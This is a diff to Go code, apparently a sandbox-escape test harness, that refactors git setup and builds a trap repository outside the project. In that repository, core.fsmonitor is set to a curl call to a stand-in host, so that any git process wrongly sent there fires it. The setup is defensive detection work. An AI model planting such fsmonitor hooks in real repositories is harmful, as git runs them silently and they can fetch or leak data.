@@ -284,39 +284,30 @@ func (j *jail) writeTemplate() error {
 		}
 	}
 	if git, err := exec.LookPath("git"); err == nil {
-		work := filepath.Join(t, "work")
-		run := func(args ...string) error {
-			cmd := exec.Command(git, args...)
-			cmd.Dir = work
-			cmd.Env = []string{"HOME=" + filepath.Join(t, "home"), "GIT_CONFIG_NOSYSTEM=1", "PATH=/usr/bin:/bin",
-				"GIT_AUTHOR_DATE=2026-01-01T00:00:00Z", "GIT_COMMITTER_DATE=2026-01-01T00:00:00Z"}
-			if out, err := cmd.CombinedOutput(); err != nil {
-				return fmt.Errorf("git %v: %v\n%s", args, err, out)
+		repo := func(dir string, steps ...[]string) bool {
+			for _, s := range append([][]string{{"init", "-q", "-b", "main"}, {"config", "user.email", "oracle@example.com"},
+				{"config", "user.name", "oracle"}, {"config", "gc.auto", "0"}}, steps...) {
+				cmd := exec.Command(git, s...)
+				cmd.Dir = filepath.Join(t, dir)
+				cmd.Env = []string{"HOME=" + filepath.Join(t, "home"), "GIT_CONFIG_NOSYSTEM=1", "PATH=/usr/bin:/bin",
+					"GIT_AUTHOR_DATE=2026-01-01T00:00:00Z", "GIT_COMMITTER_DATE=2026-01-01T00:00:00Z"}
+				if cmd.Run() != nil {
+					os.RemoveAll(filepath.Join(t, dir, ".git"))
+					return false
+				}
 			}
-			return nil
+			return true
 		}
-		steps := [][]string{
-			{"init", "-q", "-b", "main"},
-			{"config", "user.email", "oracle@example.com"},
-			{"config", "user.name", "oracle"},
-			{"config", "gc.auto", "0"},
-			{"add", "a.txt", "b.txt", "notes.md", "src/main.go"},
-			{"commit", "-q", "-m", "one"},
-			{"add", "src/util.go", "x", "y"},
-			{"commit", "-q", "-m", "two"},
-		}
-		ok := true
-		for _, s := range steps {
-			if err := run(s...); err != nil {
-				ok = false
-				break
-			}
-		}
-		if ok {
-			j.hasGit = true
-		} else {
-			os.RemoveAll(filepath.Join(work, ".git"))
-		}
+		j.hasGit = repo("work", []string{"add", "a.txt", "b.txt", "notes.md", "src/main.go"}, []string{"commit", "-q", "-m", "one"},
+			[]string{"add", "src/util.go", "x", "y"}, []string{"commit", "-q", "-m", "two"})
+		// A hostile repository outside the project, which a git sent there
+		// by -C, --git-dir, GIT_DIR or a link and a .. (git takes "lnk/.."
+		// as the kernel does, not as text) gives away: what it shows of the
+		// repository holds the outside token, and as soon as it reads the
+		// index it runs the program core.fsmonitor names (set last, so that
+		// the setup's own git does not run it).
+		repo("outside", []string{"add", "secret.txt", "dir/file"}, []string{"commit", "-q", "-m", "outside"},
+			[]string{"config", "core.fsmonitor", "curl http://203.0.113.1/outside-repo"})
 	}
 	return nil
 }
@@ -767,7 +758,13 @@ func parseTrace(text string, glue bool) []traceCmd {
 			// oracle seed 109) hands it a word that holds this line.
 			continue
 		}
-		if r.raw == "command pwd -P" || r.level == 1 && r.raw == ":" {
+		if first := strings.Fields(strings.SplitN(r.raw, "\n", 2)[0]); r.raw == "command pwd -P" || len(first) > 0 && first[0] == ":" {
+			// (A ":" runs nothing, whatever stands after it. And what
+			// stands after it may not be its own: the stages of a
+			// pipeline trace to one file at once, and a line another
+			// stage wrote in the middle of a word of its own, held
+			// together with this one by glue, read as ":"'s words. Oracle
+			// seed 156: "then :;" beside "export $(set)" in a pipeline.)
 			continue
 		}
 		out = append(out, traceCmd{level: r.level, words: words, raw: r.raw})
